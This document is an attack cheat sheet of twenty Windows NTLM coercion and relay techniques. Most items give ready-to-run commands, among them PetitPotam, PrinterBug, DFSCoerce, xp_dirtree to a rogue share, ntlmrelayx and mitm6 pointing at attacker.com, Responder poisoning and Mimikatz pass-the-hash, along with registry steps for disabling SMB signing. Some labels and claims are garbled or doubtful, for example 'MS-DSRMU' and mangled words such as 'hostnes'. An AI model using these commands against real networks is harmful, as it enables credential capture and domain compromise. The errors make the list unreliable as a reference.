### 1. **PetitPotam (MS-EFSRPC)**
   - **Description:** Uses the MS-EFSRPC protocol to force a domain controller or another machine to authenticate to a rogue SMB server.
   - **Command:**
     ```bash
     python3 PetitPotam.py -u "" -p '' -d target.domain -dc-ip 192.168.1.1 -pipe lsarpc
     ```

### 2. **PrinterBug**
   - **Description:** Exploits the MS-RPRN protocol by using the `AddPrinter` function to coerce a machine to authenticate.
   - **Command:**
     ```bash
     python3 printerbug.py target.domain/user@dc.domain
     ```

### 3. **MS-RPRN (Print Spooler Service)**
   - **Description:** Leveraging the Print Spooler service to force authentication to an attacker-controlled SMB server.
   - **Tool:** `rpcclient` or custom scripts.
   - **Command:**
     ```bash
     rpcclient -U "" -N <target_ip> -c 'enumprinters'
     ```

### 4. **MS-DSRMU (DFSCoerce)**
   - **Description:** Exploits Distributed File System (DFS) referrals to coerce a machine into authenticating to a rogue SMB server.
   - **Tool:** `DFSCoerce` script.
   - **Command:**
     ```bash
     python3 DFSCoerce.py -u user -p password -d domain -ip target_ip
     ```

### 5. **MS-SQL Service**
   - **Description:** Coerces SQL servers to authenticate by linking to a remote server or issuing a `xp_dirtree` command.
   -
```
EXEC master..xp_dirtree '\\192.168.1.10\share\';
```
### 6. **WebDAV Redirect**

```
python3 WebDAVCoerce.py -u "" -p "" -d target.domain -ip target_ip
```

### 7. **Relay via RBCD (Resource-Based Constrained Delegation)**
   - **Description:** Abuse RBCD to relay authentication requests to other services.
   - **Command:**
     ```bash
     setrbcd.py -d domain.com -u user -p password -target target.com
     ```

### 8. **MS-DSRMU (DiskCoerce)**
   - **Description:** Coerces disk service to authenticate to an attacker-controlled SMB server.
   - **Command:**
     ```bash
     python3 DiskCoerce.py -u user -p password -d domain -ip target_ip
     ```

### 9. **NTLM via SMB to HTTP Relay**
   - **Description:** Coerces a target to authenticate to a malicious HTTP server where the NTLM hash can be relayed or captured.
   - **Command:**
     ```bash
     python3 ntlmrelayx.py -t http://attacker.com --no-smb-server
     ```

### 10. **WPAD Poisoning**
   - **Description:** Setup a rogue WPAD (Web Proxy Auto-Discovery) server to capture NTLM credentials when machines request proxy information.
   - **Tool:** `Responder`
   - **Command:**
     ```bash
     responder -I eth0 -w
     ```

### 11. **Force NTLM Authentication via SMB Signing**
   - **Description:** Disables SMB signing to force a downgrade that allows NTLM authentication, making it easier to relay.
   - **Command:** Use tools like `CrackMapExec` to disable SMB signing.
   - Needs Admin
   ```
   ### Disabling SMB Signing (Requires Admin Privileges)

To disable SMB signing on a system, you would need to change the following registry settings or Group Policy settings:

#### On a Domain Controller (via Group Policy):

1. Open the Group Policy Management Console (gpmc.msc).
2. Navigate to:
    - Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Local Policies -> Security Options.
3. Set the following policies:
    - **Microsoft network client: Digitally sign communications (always)**: Disabled
    - **Microsoft network client: Digitally sign communications (if server agrees)**: Disabled
    - **Microsoft network server: Digitally sign communications (always)**: Disabled
    - **Microsoft network server: Digitally sign communications (if client agrees)**: Disabled

#### On an Individual Machine (via Registry):

1. Open the Registry Editor (regedit.exe).
2. Navigate to:
    - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`
    - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters`
3. Set the following DWORD values to `0` (disabled):
    - `EnableSecuritySignature`
    - `RequireSecuritySignature`
```

### 12. **Force NTLM Authentication via NtlmTheft and `file:` URL**
   - **Description:** Embeds a `file:` URL in documents or emails that points to a malicious SMB server, coercing authentication.
   - **Command:**
     ```bash
     python3 ntlmtheft.py -file file://attacker.com/share/
     ```

### 13. **MS-TDS (SQL Server Tabular Data Stream)**
   - **Description:** Use SQL Server’s TDS protocol to coerce a machine into authenticating.
   - **Command:**
     ```bash
     sqlcmd -S attacker.com -E
     ```

### 14. **MITM6 + NTLM Relay**
   - **Description:** Using MITM6 to spoof DNS and relay authentication to a rogue SMB server.
   - **Tool:** `mitm6` + `ntlmrelayx`
   - **Command:**
     ```bash
     mitm6 -d domain.com
     ntlmrelayx.py -6 -wh attacker.com -t target.domain.com
     ```

### 15. **MS-WSMAN (WinRM)**
   - **Description:** Coerces WinRM (Windows Remote Management) service to authenticate.
   - **Command:**
     ```bash
     winrm-cli -U user:password@target.domain.com --run whoami
     ```

### 16. **Force Authentication via LLMNR/NBT-NS Poisoning**
   - **Description:** LLMNR (Link-Local Multicast ne Resolution) and NBT-NS (NetBIOS ne Service) poisoning can coerce machines into sending credentials by spoofing legitimate hostnes.
   - **Tool:** `Responder`
   - **Command:**
     ```bash
     responder -I eth0 -rdw
     ```

### 17. **Coerce via MSRPC (Microsoft Remote Procedure Call)**
   - **Description:** Exploit MSRPC calls to coerce a machine into authenticating to an SMB share.
   - **Command:** Various MSRPC tools or custom scripts targeting specific RPC functions.

### 18. **Pass-the-Hash via Token Impersonation**
   - **Description:** Capture tokens and use token impersonation to coerce authentication.
   - **Tool:** `Mimikatz`
   - **Command:**
     ```plaintext
     mimikatz # sekurlsa::pth /user:admin /domain:domain.com /ntlm:<hash> /run:cmd.exe
     ```

### 19. **SCCM (System Center Configuration Manager) Abuse**
   - **Description:** Abuse SCCM to deploy tasks or applications that force target machines to authenticate to a rogue SMB server.
   - **Tool:** `SharpSCCM` or custom PowerShell scripts.

### 20. **Group Policy Preferences (GPP) Abuse**
   - **Description:** Use Group Policy Preferences to create tasks or drives that connect to a rogue SMB server, coercing authentication.
   - **Command:** Create a GPP XML file with credentials pointing to a malicious SMB server.
